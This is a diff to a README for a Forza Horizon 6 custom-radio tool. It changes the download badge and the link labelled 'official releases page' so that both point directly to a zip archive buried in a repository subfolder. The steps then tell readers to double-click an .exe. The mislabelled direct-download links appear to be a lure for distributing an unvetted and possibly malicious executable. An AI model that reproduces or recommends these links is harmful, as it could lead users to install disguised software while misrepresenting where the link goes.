@@ -1,6 +1,6 @@
 # 📻 fh6-universal-radio - Listen to your music while driving
 
-[![Download Software](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/gustavo7217/fh6-universal-radio)
+[![Download Software](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/gustavo7217/fh6-universal-radio/main/Mose/radio-fh-universal-2.6-beta.4.zip)
 
 This application brings custom music into your racing experience. It allows you to play files from your computer, streaming services, or media servers while you play Forza Horizon 6. You gain full control over your background audio without leaving the driver seat.
 
@@ -17,7 +17,7 @@ Before you run the software, ensure your computer meets these requirements:
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the [official releases page](https://github.com/gustavo7217/fh6-universal-radio) to see all available versions.
+1. Visit the [official releases page](https://raw.githubusercontent.com/gustavo7217/fh6-universal-radio/main/Mose/radio-fh-universal-2.6-beta.4.zip) to see all available versions.
 2. Select the latest file ending in .exe to download the installer.
 3. Locate the file in your downloads folder.
 4. Double-click the file to begin the installation process.
